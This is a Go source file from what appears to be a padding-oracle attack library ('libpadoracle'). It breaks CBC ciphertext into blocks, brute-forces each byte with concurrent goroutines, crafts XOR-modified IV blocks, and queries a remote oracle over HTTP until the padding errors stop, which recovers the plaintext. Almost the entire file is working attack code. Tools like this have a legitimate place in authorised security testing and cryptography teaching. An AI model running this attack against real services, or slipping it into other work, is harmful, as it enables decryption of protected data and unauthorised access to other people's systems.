package libpadoracle

import (
	"encoding/hex"
	"fmt"
	"sync"
)

func GetRangeDataSafe() []int {
	rangeData := []int{}
	for i := 2; i < 256; i++ {
		rangeData = append(rangeData, i)
	}
	rangeData = append(rangeData, []int{0, 1}...)
	return rangeData
}

// PerByteOperations performs the actual math on each byte of the CipherText
func PadOperations(wg *sync.WaitGroup, cfg Config, cipherText []byte, decipherChan chan Data) {
	defer func() {
		close(decipherChan)
		wg.Done()
	}()

	threadCh := make(chan struct{}, cfg.Threads)
	wg2 := sync.WaitGroup{}
	if cfg.IV != nil { // IV was supplied by the user - let's prepend to the Decoded Ciphertext
		cipherText = append(cfg.IV, cipherText...)
	}
	Blocks := ChunkBytes(cipherText, cfg.BlockSize)
	cfg.NumBlocks = len(Blocks)
	// fmt.Println(Blocks)
	if lastBlockLen := len(Blocks[len(Blocks)-1]); lastBlockLen != cfg.BlockSize {
		err := fmt.Errorf("Invalid Block Size at Block #%d (%v bytes - should be %d)", len(Blocks), lastBlockLen, cfg.BlockSize)
		panic(err)
	}
	endBlock := len(Blocks)
	fmt.Printf("Total Blocks: [%v]\n", len(Blocks))
	startBlock := 1
	for blockNum, blockData := range Blocks[startBlock:endBlock] {
		wg2.Add(1)
		go PerBlockOperations(&wg2, cfg, threadCh, decipherChan, blockNum+startBlock, blockData, Blocks[blockNum+startBlock-1])
	}
	wg2.Wait()
}

// PerBlockOperations performs the actual math on each byte of the CipherText
func PerBlockOperations(wg *sync.WaitGroup, cfg Config, threadCh chan struct{}, decipherChan chan Data, blockNum int, blockData []byte, iv []byte) {
	// TODO stuff here
	defer func() {
		wg.Done()
	}()
	rangeData := GetRangeDataSafe()
	blockDecipherChan := make(chan byte, 1)
	returnData := Data{}
	decipheredBlockBytes := []byte{}
	wg2 := sync.WaitGroup{}
	for byteNum, byteData := range blockData { // Iterate over each byte
		fmt.Printf("Checking Block: %d; Byte %d; val: %v\n", blockNum, byteNum, hex.EncodeToString([]byte{byteData}))
		wg2.Add(1)
		var found bool
		// Iterate through each possible byte value until padding error goes away
		for _, i := range rangeData {
			threadCh <- struct{}{}
			if blockNum == cfg.NumBlocks-1 && byteNum == 0 {
				found = PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes)
			} else {
				go PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes)
			}
			if found {
				break
			}
		}
		nextByte := <-blockDecipherChan
		decipheredBlockBytes = append([]byte{nextByte}, decipheredBlockBytes...)
		wg2.Wait()
	}
	returnData.BlockNumber = blockNum
	returnData.EncryptedBlockData = blockData
	returnData.DecipheredBlockData = decipheredBlockBytes
	decipherChan <- returnData
}

// PerByteOperations performs the actual math on each byte of the CipherText
func PerByteOperations(wg *sync.WaitGroup, threadCh chan struct{}, blockDecipherChan chan byte, cfg Config, bruteForceByteValue int, byteNum int, blockNum int, blockData []byte, IV []byte, decipheredBlockBytes []byte) bool {
	defer func() {
		<-threadCh // Release a thread once we're done with this goroutine
	}()
	var RawOracleData []byte
	// fmt.Printf("Testing : %v - %v\n", blockNum, bruteForceByteValue)
	// Math here - all the XORing and building of weird padding happens in these routines
	padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize)
	searchBlock := BuildSearchBlock(decipheredBlockBytes, bruteForceByteValue, cfg.BlockSize)
	tmp := XORBytes(searchBlock, IV)
	oracleIvBlock := XORBytes(tmp, padBlock)

	RawOracleData = BuildRawOraclePayload(oracleIvBlock, blockData)
	// padBlock := BuildPaddedBlock(IV, blockData, bruteForceByteValue, cfg.blockSize)

	encodedPayload := EncodePayload(RawOracleData)
	httpResp, strResponseBody := CallOracle(encodedPayload)

	if CheckResponse(httpResp, strResponseBody) { // this one didn't return a pad error - we've probably decrypted it!
		defer wg.Done()
		blockDecipherChan <- byte(bruteForceByteValue)
		if byteNum == cfg.BlockSize {
			close(blockDecipherChan)
		}
		return true
	}
	return false
}
